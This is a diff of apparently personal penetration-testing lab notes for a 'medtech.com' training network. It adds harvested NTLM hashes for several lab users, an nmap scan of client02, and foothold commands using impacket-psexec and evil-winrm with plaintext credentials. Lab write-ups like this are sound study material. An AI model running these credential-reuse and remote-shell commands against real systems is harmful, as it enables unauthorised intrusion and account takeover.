@@ -87,7 +87,18 @@ Host script results:
     ``` 
         impacket-psexec medtech.com/joe:Flowers1@172.16.184.11
     ```
+## Interesting Info
 
+```
+    88934 Oct 04 11:21  Backup      daisy                        6872 Backup Completed. NTLM: abf36048c1cf88f5603381c5128feb8e 
+
+   88605 Oct 04 11:21  Backup      toad                         6872 Backup Completed. NTLM: 5be63a865b65349851c1f11a067a3068 
+
+   88137 Oct 04 11:21  Backup      wario                        6872 Backup Completed. NTLM: fdf36048c1cf88f5630381c5e38feb8e 
+
+    87139 Oct 04 11:21  Backup      goomba                       6872 Backup Completed. NTLM: 8e9e1516818ce4e54247e71e71b5f436
+
+```
 # VM 6
 - dev04.medtech.com
 ```
@@ -200,8 +211,35 @@ Host script results:
 # VM 10
 - client02.medtech.com
 ```
-?
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5040/tcp  open  unknown
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
+Host script results:
+| smb2-time: 
+|   date: 2024-07-30T14:52:28
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: -10s
+|_nbstat: NetBIOS name: CLIENT02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:7d:47 (VMware)
 ```
 
 ```
@@ -217,4 +255,9 @@ SMB         172.16.184.83   445    CLIENT02         IPC$            READ        
 SMB         172.16.184.83   445    CLIENT02         Windows         READ            
                                                                                         
 ```
+## FootHold
+1. ``` 
+    evil-winrm -i 172.16.201.83 -u 'medtech.com\wario' -p 'Mushroom!' 
+    ```
 
+## Root
